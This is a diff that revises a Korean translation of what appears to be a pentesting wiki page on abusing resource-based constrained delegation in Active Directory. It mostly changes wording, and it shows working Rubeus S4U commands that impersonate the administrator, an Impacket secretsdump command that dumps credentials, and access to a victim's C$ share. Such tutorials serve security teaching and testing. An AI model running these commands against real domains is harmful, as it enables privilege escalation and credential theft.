@@ -24,10 +24,10 @@
 
 공격자가 이미 **희생 컴퓨터에 대한 쓰기 동등 권한**을 가지고 있다고 가정합니다.
 
-1. 공격자는 **SPN**이 있는 계정을 **타락시키거나** 하나를 **생성**합니다 (“Service A”). **특별한 권한** 없이도 **모든** _관리자 사용자_는 최대 10개의 컴퓨터 객체(**_MachineAccountQuota_**)를 **생성**하고 **SPN**을 설정할 수 있습니다. 따라서 공격자는 컴퓨터 객체를 생성하고 SPN을 설정할 수 있습니다.
-2. 공격자는 희생 컴퓨터(ServiceB)에 대한 **쓰기 권한**을 악용하여 **리소스 기반 제약 위임을 구성하여 ServiceA가 해당 희생 컴퓨터(ServiceB)에 대해 어떤 사용자도 가장할 수 있도록** 합니다.
-3. 공격자는 Rubeus를 사용하여 **Service A**에서 **Service B**로 **전체 S4U 공격**(S4U2Self 및 S4U2Proxy)을 수행합니다. 이때 **Service B에 대한 특권 액세스**가 있는 사용자로부터 요청합니다.
-   1. S4U2Self (타락시키거나 생성한 SPN에서): **관리자에게 TGS를 요청합니다** (Forwardable 아님).
+1. 공격자는 **SPN**이 있는 계정을 **타락시키거나** (“Service A”) **하나를 생성합니다**. **특별한 권한** 없이도 **모든** _관리 사용자_는 최대 10개의 컴퓨터 객체(**_MachineAccountQuota_**)를 **생성**하고 **SPN**을 설정할 수 있습니다. 따라서 공격자는 단순히 컴퓨터 객체를 생성하고 SPN을 설정할 수 있습니다.
+2. 공격자는 희생 컴퓨터(ServiceB)에 대한 **쓰기 권한**을 악용하여 **리소스 기반 제약 위임을 구성하여 ServiceA가 해당 희생 컴퓨터(ServiceB)에 대해 모든 사용자를 가장할 수 있도록** 합니다.
+3. 공격자는 Rubeus를 사용하여 **Service A에서 Service B로의 전체 S4U 공격**(S4U2Self 및 S4U2Proxy)을 수행합니다. 이때 **Service B에 대한 특권 액세스가 있는 사용자**를 대상으로 합니다.
+   1. S4U2Self (타락시키거나 생성한 SPN에서): **관리자에게 TGS를 요청합니다** (Forwardable이 아님).
    2. S4U2Proxy: 이전 단계의 **Forwardable이 아닌 TGS**를 사용하여 **희생 호스트**에 대한 **관리자**의 **TGS**를 요청합니다.
    3. Forwardable이 아닌 TGS를 사용하더라도 리소스 기반 제약 위임을 악용하고 있으므로 작동합니다.
    4. 공격자는 **티켓을 전달**하고 **사용자를 가장하여 희생 ServiceB에 대한 **액세스**를 얻을 수 있습니다.
@@ -70,9 +70,9 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
-### S4U 공격 수행하기 (Windows/Rubeus)
+### Performing a complete S4U attack (Windows/Rubeus)
 
-우선, 우리는 비밀번호 `123456`로 새로운 컴퓨터 객체를 생성했으므로, 해당 비밀번호의 해시가 필요합니다:
+먼저, 우리는 비밀번호 `123456`로 새로운 컴퓨터 객체를 생성했으므로, 해당 비밀번호의 해시가 필요합니다:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
@@ -81,7 +81,7 @@ msds-allowedtoactonbehalfofotheridentity
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Rubeus의 `/altservice` 매개변수를 사용하여 한 번 요청하는 것만으로 더 많은 서비스에 대한 티켓을 생성할 수 있습니다:
+Rubeus의 `/altservice` 매개변수를 사용하여 한 번 요청함으로써 더 많은 서비스에 대한 더 많은 티켓을 생성할 수 있습니다:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
@@ -107,12 +107,12 @@ export KRB5CCNAME=$(pwd)/Administrator.ccache
 # Example: dump local secrets via Kerberos (no NTLM)
 impacket-secretsdump -k -no-pass Administrator@victim.domain.local
 ```
-Notes
+노트
 - LDAP 서명/LDAPS가 강제되는 경우, `impacket-rbcd -use-ldaps ...`를 사용하십시오.
 - AES 키를 선호하십시오; 많은 현대 도메인이 RC4를 제한합니다. Impacket과 Rubeus는 모두 AES 전용 흐름을 지원합니다.
-- Impacket은 일부 도구에 대해 `sname` ("AnySPN")을 재작성할 수 있지만, 가능한 경우 올바른 SPN을 얻으십시오 (예: CIFS/LDAP/HTTP/HOST/MSSQLSvc).
+- Impacket은 일부 도구에 대해 `sname`("AnySPN")을 재작성할 수 있지만, 가능한 경우 항상 올바른 SPN을 얻으십시오 (예: CIFS/LDAP/HTTP/HOST/MSSQLSvc).
 
-### Accessing
+### 접근
 
 마지막 명령줄은 **완전한 S4U 공격을 수행하고 TGS를** 관리자에서 피해자 호스트의 **메모리**로 주입합니다.\
 이 예에서는 관리자에게서 **CIFS** 서비스에 대한 TGS가 요청되었으므로 **C$**에 접근할 수 있습니다:
@@ -127,7 +127,7 @@ ls \\victim.domain.local\C$
 
 ### RBCD가 구성된 컴퓨터 열거
 
-PowerShell (SID를 해결하기 위해 SD 디코딩):
+PowerShell (SID를 해결하기 위해 SD를 디코딩):
 ```powershell
 # List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
 Import-Module ActiveDirectory
@@ -188,7 +188,7 @@ adws-enumeration.md
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
 {{#endref}}
 
-## 참고 문헌
+## 참조
 
 - [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 - [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
